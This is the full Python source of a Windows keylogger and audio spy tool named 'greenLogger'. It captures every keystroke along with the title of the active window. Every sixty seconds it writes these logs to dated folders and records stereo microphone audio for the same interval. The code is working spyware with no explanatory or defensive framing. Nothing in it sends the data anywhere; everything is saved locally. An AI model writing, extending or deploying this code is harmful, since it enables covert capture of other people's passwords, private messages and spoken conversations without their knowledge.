import keyboard  
from threading import Thread, Timer
from datetime import datetime
from win32gui import GetWindowText, GetForegroundWindow
import os
import sounddevice as sd
import wavio as wv



class greenLogger:
    def __init__(self, interval):
        self.interval = interval
        self.start_dt = ""
        self.end_dt = ""
        self.tmp_wintext = ""
        self.log = ""

    def keyboardCallback(self, event):
        wt = GetWindowText(GetForegroundWindow())
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        if self.tmp_wintext != wt:
            self.tmp_wintext = wt
            name = f"\n[On Window {self.tmp_wintext}]\n" + name
        self.log += name

    def _vrecorder(self):
        fs = 44100
        path = f'log/{datetime.now().date().strftime("%m_%d")}/vlog'
        if not os.path.exists(path):
            os.makedirs(path)
        myrecording = sd.rec(int(self.interval * fs),
                             samplerate=fs, channels=2)
        sd.wait()
        filename = self.getFileName()
        wv.write(f"{path}/{filename}.wav", myrecording, fs, sampwidth=2)

    def getFileName(self):
        start_dt_str = str(self.start_dt)[
            :-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        return f"keylog-{start_dt_str}_{end_dt_str}"


    def report(self,voiceRecord=True):
        if self.log:
            self.end_dt = datetime.now()
            path = f'log/{datetime.now().date().strftime("%m_%d")}/klog'
            filename = self.getFileName()
            if not os.path.exists(path):
                os.makedirs(path)
            with open(f"{path}/{filename}.txt", "w", encoding='utf-8') as f:
                print(self.log, file=f)
            self.start_dt = datetime.now()
            self.log = ""
        if voiceRecord: Thread(target=self._vrecorder).start()
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()


    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.keyboardCallback)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    logger = greenLogger(interval=60)
    logger.start()
